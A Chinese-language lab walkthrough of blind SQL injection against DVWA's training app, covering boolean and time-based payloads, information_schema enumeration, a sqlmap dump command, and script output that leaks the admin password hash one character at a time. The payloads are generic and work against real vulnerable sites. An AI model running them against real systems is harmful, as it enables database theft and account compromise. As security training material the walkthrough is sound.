> 注意：DVWA 盲注**不会直接输出查询结果**，页面只有两种状态：
> `User ID exists in the database.`（条件为真 ✔）
> `User ID is MISSING from the database.`（条件为假 ❌）
> 底层 SQL：`SELECT first_name, last_name FROM users WHERE user_id = '$id';`，Low 级别是**单引号字符型布尔盲注**。
> 账号：`admin`，密码：`password`登录 DVWA，先在`DVWA Security`设置安全等级。

## Low 难度（手工布尔盲注）

### 1. 判断注入点

1. 输入`1` → exists（正常）
2. 输入`1'` → MISSING，单引号破坏 SQL 语法，证明**字符型单引号注入**
3. 永真测试：

```
1' and 1=1 #
```

返回 exists ✔
4. 永假测试：

```
1' and 1=2 #
```

返回 MISSING ❌

>
> `#`是 MySQL 注释，把后面的单引号注释掉闭合语句。

### 2. 获取当前数据库名长度

```
1' and length(database())=4 #
```

返回 exists，说明数据库名长度 = 4，数据库名：`dvwa`。

### 3. 逐字符猜数据库名（ascii+substr）

```
# 猜第1位
1' and ascii(substr(database(),1,1))=100 #
# substr(字符串,起始位置,截取长度)；100是字符'd'的ASCII码
```

第 1 位`d`(100)、第 2 位`v`(118)、第 3 位`w`(119)、第 4 位`a`(97)，拼接得到`dvwa`。

### 4. 猜 dvwa 库中的表名

查询 information_schema 元数据表，猜第一张表名字符：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #
```

- `limit 0,1`取第 0 行第一条表；`limit 1,1`取第二张表。
dvwa 库两张核心表：`guestbook`、**`users`**（存放账号密码）。

### 5. 猜 users 表的字段名

```
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1))=117 #
```

得到字段：`user`、`password`（存储用户名和 md5 密码哈希）。

### 6. 爆破用户名和密码哈希

猜第一条记录用户名 admin 的第一位：

```
1' and ascii(substr((select user from users limit 0,1),1,1))=97 #
```

同理猜 password 字段，拿到 MD5 哈希，再解密得到明文密码。

---

## Time‑Based 时间盲注（页面真假无区别时使用）

用`if(条件,sleep(5),1)`，条件为真页面会**延迟 5 秒加载**，条件假无延迟。

```
1' and if(ascii(substr(database(),1,1))=100,sleep(5),1) #
```

## Medium 难度

- 后端做了单引号转义，**数字型注入，不带单引号**，需要 Burp 抓包修改 POST 参数 id。
payload 示例（去掉单引号）：

```
1 and length(database())=4 #
```

真假同样看 exists/MISSING。

## High 难度

页面新开弹窗输入 id，注入点在 Cookie，同样字符单引号盲注，payload 和 Low 一致，需要抓包修改 Cookie 中的 id 值。



## SQLMap 一键通关（工具方式）

带上 DVWA 会话 Cookie，直接跑盲注：

```
sqlmap -u "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
--cookie="security=low;PHPSESSID=你的会话ID" \
--batch --dump --technique=B
```



==== 开始布尔盲注 DVWA sqli_blind ====
[库名]第1位: d
[库名]第2位: v
[库名]第3位: w
[库名]第4位: a

数据库名: dvwa

[表0]第1位: g
[表0]第2位: u
[表0]第3位: e
[表0]第4位: s
[表0]第5位: t
[表0]第6位: b
[表0]第7位: o
[表0]第8位: o
[表0]第9位: k
表0: guestbook
[表1]第1位: u
[表1]第2位: s
[表1]第3位: e
[表1]第4位: r
[表1]第5位: s
表1: users

✅找到users表，开始爆破账号密码

[行0][user]第1位: a
[行0][user]第2位: d
[行0][user]第3位: m
[行0][user]第4位: i
[行0][user]第5位: n
[行0][password]第1位: 2
[行0][password]第2位: 0
[行0][password]第3位: 2
[行0][password]第4位: c
[行0][password]第5位: b
[行0][password]第6位: 9
[行0][password]第7位: 6
[行0][password]第8位: 2
[行0][password]第9位: a
[行0][password]第10位: c
[行0][password]第11位: 5
[行0][password]第12位: 9
[行0][password]第13位: 0
[行0][password]第14位: 7
[行0][password]第15位: 5
[行0][password]第16位: b
[行0][password]第17位: 9